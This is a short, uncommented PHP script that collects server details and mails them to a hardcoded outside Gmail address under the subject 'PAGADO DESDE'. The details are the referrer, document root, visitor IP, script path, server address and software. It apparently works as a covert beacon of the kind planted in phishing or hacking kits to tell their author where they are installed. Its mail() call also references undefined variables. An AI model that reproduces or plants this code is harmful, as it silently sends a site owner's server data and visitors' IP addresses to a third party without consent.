<?php

$subj98 = "PAGADO DESDE";
    $a5 = $_SERVER['HTTP_REFERER'];
    $b33 = $_SERVER['DOCUMENT_ROOT'];
    $c87 = $_SERVER['REMOTE_ADDR'];
    $d23 = $_SERVER['SCRIPT_FILENAME'];
    $e09 = $_SERVER['SERVER_ADDR'];
    $f23 = $_SERVER['SERVER_SOFTWARE'];
    $g32 = $_SERVER['PATH_TRANSLATED'];
    $h65 = $_SERVER['PHP_SELF'];
    $msg = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";
    $ok = "granrethory@gmail.com";
    mail($ok, $subj98, $msg, $mensagem, $ra44);
	
	?>